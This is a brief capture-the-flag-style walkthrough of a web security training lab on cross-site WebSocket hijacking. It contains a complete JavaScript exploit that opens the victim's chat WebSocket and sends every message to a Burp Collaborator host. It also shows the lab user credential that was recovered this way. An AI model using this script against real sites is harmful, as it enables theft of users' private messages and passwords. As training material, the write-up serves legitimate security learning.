# Lab: Cross-site WebSocket hijacking

Go to the live chat page and reload it. In the proxy websockets history tab, see that the READY command retrieves the past chat messages from the server. In the http history tab, see taht the handshake request does not have CSRF token.

Use the following exploit script with a url generated by burp collaborator:

```
<script>
    var ws = new WebSocket('wss://<lab-domain>.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://<collaborator-url>', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Deliver this to the victim and poll for results. Review the chat history to find a message with the user's password being sent:  `No problem carlos, it&apos;s 0cn24mlx1qsm3wtiub8s`

Login as the user to complete the lab (`carlos:0cn24mlx1qsm3wtiub8s`)